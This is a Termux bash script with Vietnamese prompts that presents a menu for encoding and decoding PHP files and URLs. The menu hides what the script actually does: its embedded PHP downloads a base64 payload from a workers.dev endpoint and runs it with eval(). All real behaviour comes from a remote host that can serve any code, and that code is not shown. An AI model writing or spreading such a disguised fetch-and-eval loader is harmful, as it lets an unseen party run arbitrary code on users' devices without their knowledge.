#!/data/data/com.termux/files/usr/bin/bash

cd "$(dirname "$0")"

clear
echo -e "===== [TOOL PHP SYSTEM BY AN ORIN] =====\n"
echo "[1] Encode File"
echo "[2] Decode File"
echo "[3] Decode URL"
echo "[4] Encode URL"

read -p "Chọn: " choose

case $choose in
    1) mode=8 ;;
    2) mode=10 ;;
    3) mode=12 ;;
    4) mode=14 ;;
    *) echo "Sai lựa chọn"; exit ;;
esac

MODE=$mode php <<'EOF'
<?php

$mode = getenv("MODE");

$url = "https://old-rain-6157.anorintool.workers.dev/?mode=" . $mode;

$context = stream_context_create([
    "http" => [
        "timeout" => 10,
        "header" => "User-Agent: AnorinClient/3.0\r\n"
    ]
]);

$menu = @file_get_contents($url, false, $context);

if (!$menu) {
    exit("❌ Không kết nối được API\n");
}

$data = json_decode($menu, true);

if (!$data || !isset($data['status'])) {
    exit("❌ JSON không hợp lệ\n");
}

if ($data['status'] !== 'success') {
    exit("⚠️ API lỗi\n");
}

if (empty($data['data'])) {
    exit("⚠️ Không có dữ liệu\n");
}

$real = base64_decode($data['data']);

if ($real === false || trim($real) === "") {
    exit("⚠️ Decode rỗng\n");
}

eval("?>".$real);

?>
EOF
